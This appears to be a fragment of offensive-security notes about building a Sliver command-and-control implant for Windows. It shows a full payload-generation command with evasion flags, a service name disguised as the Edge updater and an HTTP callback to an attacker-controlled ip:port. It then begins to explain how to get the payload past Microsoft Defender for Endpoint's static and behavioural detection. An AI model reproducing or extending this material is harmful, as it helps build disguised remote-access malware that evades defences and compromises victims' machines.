generate --os windows \
  --arch amd64 \
  --format exe \
  --evasion \
  --disable-sgn \
  --name edgeupdsvc \
  --http https://ip:port \
  --save /tmp/edgeupdsvc.exe




-f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)


To make a Sliver payload not detectable by Microsoft Defender for Endpoint (MDE), you need to completely evade both static and behavioral detection, because:

Sliver-generated EXEs are signatured â†’ easily caught by MDE via static rules.
Even with --evasion, binary patterns, import tables, and section names are not deeply obfuscated.

MDE uses behavioral + memory analysis (AMSI, ETW, API hooking).
